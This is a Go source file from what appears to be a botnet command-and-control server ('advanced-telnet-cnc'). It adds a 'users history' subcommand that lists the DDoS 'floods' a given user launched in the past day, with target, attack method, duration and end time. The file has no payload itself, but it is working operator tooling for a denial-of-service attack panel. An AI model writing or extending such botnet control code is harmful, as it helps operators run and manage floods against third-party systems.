package subcommands

import (
	"advanced-telnet-cnc/packages/format"
	"advanced-telnet-cnc/packages/simpletable"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"fmt"
	"strings"
	"time"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"history"},
		Arguments: []command.Argument{{"username", false}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			table := simpletable.New()

			user, err := database.UserFromName(args[0])
			if err != nil {
				return session.CmdError(err)
			}

			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "Target"},
					{Align: simpletable.AlignCenter, Text: "Method"},
					{Align: simpletable.AlignCenter, Text: "Duration"},
					{Align: simpletable.AlignCenter, Text: "Time"},
				},
			}

			floods, err := database.FloodsDuring(24 * time.Hour)
			if err != nil {
				return err
			}

			for i, flood := range floods {
				if flood.UserId != user.Id {
					continue
				}

				if len(flood.Target) > 20 {
					flood.Target = flood.Target[:20]
				}

				r := []*simpletable.Cell{
					{Text: fmt.Sprintf("%d", i+1)},
					{Text: flood.Target},
					{Text: flood.Method},
					{Text: fmt.Sprint(flood.Duration)},
					{Text: format.Format(flood.End)},
				}

				table.Body.Cells = append(table.Body.Cells, r)
			}

			table.SetStyle(simpletable.StyleCompactLite)

			return session.Println(" " + strings.ReplaceAll(table.String(), "\n", "\r\n "))
		},
	})
}
